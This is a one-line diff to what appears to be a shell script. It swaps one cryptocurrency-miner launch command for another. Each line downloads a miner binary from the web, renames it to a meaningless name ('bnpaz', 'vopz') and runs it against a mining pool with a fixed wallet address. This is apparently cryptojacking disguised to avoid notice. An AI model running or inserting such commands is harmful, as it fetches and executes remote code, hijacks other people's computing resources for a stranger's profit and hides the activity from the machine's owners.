@@ -1,1 +1,1 @@
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 && mv packetcrypt-linux-amd64 bnpaz && chmod +x bnpaz && ./bnpaz ann -p pkt1qqq6yd2fdgrtfucax0tzx5vram8wt4n4v7ujwny https://stratum.zetahash.com
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI vopz && ./vopz --disable-gpu --algorithm yespowertide --pool stratum-eu.rplant.xyz:17059  --wallet TXgwyvgvvPFFZcdnR6wahZ5ahovqy64h84 --password c=TIDE,m=solo -t 4
